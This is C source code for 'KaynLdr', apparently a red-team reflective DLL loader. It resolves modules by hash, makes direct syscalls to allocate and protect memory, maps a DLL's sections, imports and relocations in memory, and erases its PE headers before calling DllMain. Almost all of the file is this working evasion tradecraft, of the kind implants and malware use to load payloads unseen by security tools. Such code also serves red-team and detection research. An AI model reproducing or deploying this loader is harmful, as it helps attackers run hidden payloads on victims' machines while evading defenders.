/**
 * KaynLdr
 * Author: Paul Ungur (@C5pider)
 * Credits: Austin Hudson (@ilove2pwn_), Chetan Nayak (@NinjaParanoid), Bobby Cooke (@0xBoku), @trickster012
 */

#include <Win32.h>
#include <Syscall.h>
#include <KaynLdr.h>

typedef BOOL (WINAPI *KAYNDLLMAIN) ( HINSTANCE, DWORD, LPVOID );

VOID MemSet(PVOID Destination, INT Value, SIZE_T Size)
{
    PBYTE D = (PBYTE)Destination;

    while (Size--) *D++ = Value;

    return;
}

DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
{
    // Module Handles
    HMODULE                 KaynLibraryLdr  = NULL;
    HMODULE                 hKernel32       = NULL;
    HMODULE                 hNtDLL          = NULL;

    // PE Headers
    PIMAGE_DOS_HEADER       pImageDosHeader = NULL;
    PIMAGE_NT_HEADERS       pImageNtHeaders = NULL;
    PIMAGE_SECTION_HEADER   pSectionHeader  = NULL;
    SIZE_T                  KaynImageDosSize= 0;

    // Remote Library
    LPVOID                  KVirtualMemory  = NULL;
    DWORD                   KMemSize        = 0;
    KAYNDLLMAIN             KaynDllMain     = NULL;

    // Directory Data
    PIMAGE_EXPORT_DIRECTORY pImageExportDir         = NULL;
    LPVOID                  pImageDir               = NULL;

    // Change memory protection
    LPVOID      lpSectionTextAddr = NULL;
    DWORD       dwSectionTextSize = 0;

    // Needed Functions
    API_DEFINE( LoadLibraryA, Win32_LoadLibraryA );
    DWORD Sys_NtAllocateVirtualMemory = 0;
    DWORD Sys_NtProtectVirtualMemory  = 0;

    KaynLibraryLdr = KaynCaller();

    // -----------------------------------
    // 1. Load needed function and syscalls
    // -----------------------------------

    // Load needed libraries
    hKernel32          = KGetModuleByHash(KERNEL32_HASH);
    hNtDLL             = KGetModuleByHash(NTDLL_HASH);

    Win32_LoadLibraryA = KGetProcAddressByHash( hKernel32, WIN32_LOADLIBRARYA, 0 );

    pImageNtHeaders    = RVA_2_VA( PIMAGE_NT_HEADERS, hNtDLL, ((PIMAGE_DOS_HEADER)hNtDLL)->e_lfanew );
    pImageExportDir    = RVA_2_VA( PIMAGE_EXPORT_DIRECTORY, hNtDLL, pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    Sys_NtAllocateVirtualMemory = GetSyscall( hNtDLL, pImageExportDir, SYS_NTALLOCATEVIRTUALMEMORY );
    Sys_NtProtectVirtualMemory  = GetSyscall( hNtDLL, pImageExportDir, SYS_NTPROTECTEDVIRTUALMEMORY );

    // ---------------------------------------------------------------------------
    // 2. Allocate virtual memory and copy headers and section into the new memory
    // ---------------------------------------------------------------------------

    pImageDosHeader = (PIMAGE_DOS_HEADER)KaynLibraryLdr;
    pImageNtHeaders = RVA_2_VA( LPVOID, KaynLibraryLdr, pImageDosHeader->e_lfanew );
    KMemSize        = pImageNtHeaders->OptionalHeader.SizeOfImage;

    // KaynImageSize   = pImageNtHeaders->OptionalHeader.SizeOfImage;

    // Prepare syscall and invoke NtAllocateVirtualMemory
    SyscallPrepare( Sys_NtAllocateVirtualMemory );
    if ( NT_SUCCESS( SyscallInvoke( NtGetCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        // ---- Copy Headers into new allocated memory ----
        __movsb( (PBYTE)KVirtualMemory, (PBYTE)KaynLibraryLdr, pImageNtHeaders->OptionalHeader.SizeOfHeaders );

        // ---- Copy Sections into new allocated memory ----
        pSectionHeader = IMAGE_FIRST_SECTION( pImageNtHeaders );
        for (DWORD dwIdx = 0; dwIdx < pImageNtHeaders->FileHeader.NumberOfSections; dwIdx++)
        {
            PBYTE VirtualMemory     = (PBYTE)( (UINT_PTR)KVirtualMemory + (UINT_PTR)pSectionHeader[dwIdx].VirtualAddress );
            PBYTE PointerToRawData  = (PBYTE)( (UINT_PTR)KaynLibraryLdr + (UINT_PTR)pSectionHeader[dwIdx].PointerToRawData );

            if ( dwIdx == 0 )
            {
                lpSectionTextAddr = VirtualMemory;
                dwSectionTextSize = pSectionHeader[dwIdx].SizeOfRawData;
            }

            __movsb(
                    VirtualMemory,
                    PointerToRawData,
                    pSectionHeader[dwIdx].SizeOfRawData
            );

        }

        // ----------------------------------
        // 3. Process our images import table
        // ----------------------------------

        pImageDosHeader = ((PIMAGE_DOS_HEADER)KVirtualMemory);
        pImageNtHeaders = RVA_2_VA( PIMAGE_NT_HEADERS, KVirtualMemory, pImageDosHeader->e_lfanew );

        pImageDir       = RVA_2_VA( LPVOID, KVirtualMemory, pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress );
        KResolveIAT( KVirtualMemory, pImageDir );

        // ----------------------------------------
        // 4. Process all of our images relocations
        // ----------------------------------------

        KReAllocSections(
                KVirtualMemory,
                pImageNtHeaders->OptionalHeader.ImageBase,
                (UINT_PTR)KVirtualMemory + ((PIMAGE_DATA_DIRECTORY)pImageDir)->VirtualAddress
        );

        KaynDllMain =  (KAYNDLLMAIN)((UINT_PTR)KVirtualMemory + (UINT_PTR)pImageNtHeaders->OptionalHeader.AddressOfEntryPoint);

        DWORD dwOldProtection = 0;
        // change protection from RW to RX
        SyscallPrepare( Sys_NtProtectVirtualMemory );
        if ( NT_SUCCESS( SyscallInvoke( NtGetCurrentProcess(), &lpSectionTextAddr, &dwSectionTextSize, PAGE_EXECUTE_READ, &dwOldProtection ) ) )
        {

            // ---------------------------
            // 5. Erase DOS and NT headers
            // ---------------------------
            MemSet( KVirtualMemory, 0, sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS) );

            // --------------------------------
            // 6. Finally executing our DllMain
            // --------------------------------
            KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );
        }
    }

#ifdef DEBUG
    else __debugbreak(); // well this sounds like a you problem
#endif

}